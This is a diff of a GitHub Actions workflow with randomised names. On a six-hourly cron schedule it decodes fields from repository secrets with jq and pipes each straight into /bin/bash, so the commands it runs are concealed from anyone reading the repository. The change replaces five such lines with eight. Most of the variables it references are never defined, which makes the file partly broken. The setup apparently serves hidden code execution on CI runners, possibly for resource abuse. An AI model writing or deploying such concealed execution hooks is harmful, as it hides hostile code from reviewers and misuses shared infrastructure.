@@ -1,10 +1,11 @@
 name: xuzhibai3856
+
 on:
   workflow_dispatch:
   schedule:
     - cron: '45 4/6 * * *'
 
-jobs:  # 752
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,11 +13,14 @@ jobs:  # 752
       - uses: actions/checkout@v4
       - name: xuzhibai3856
         env:
-          wbce962: ${{ secrets.wbce962 }}
+          obvas2: ${{ secrets.obvas2 }}
         run: |
-          echo $wbce962 | jq -r .dipv6 | /bin/bash
-          echo $xy08404 | jq -r .ks23779 | /bin/bash
-          echo $ppxj41812 | jq -r .mr9 | /bin/bash
-          echo $qoq29170 | jq -r .azmp1 | /bin/bash
-          echo $znwwk03 | jq -r .d666 | /bin/bash
+          echo $obvas2 | jq -r .jb86 | /bin/bash
+          echo $fpxub78995 | jq -r .l87708 | /bin/bash
+          echo $lq530 | jq -r .an82452 | /bin/bash
+          echo $tklpu120 | jq -r .kp028 | /bin/bash
+          echo $ig07973 | jq -r .s47627 | /bin/bash
+          echo $mugr16992 | jq -r .ld0 | /bin/bash
+          echo $tcc29 | jq -r .kko8 | /bin/bash
+          echo $pov3 | jq -r .qbo897 | /bin/bash
 
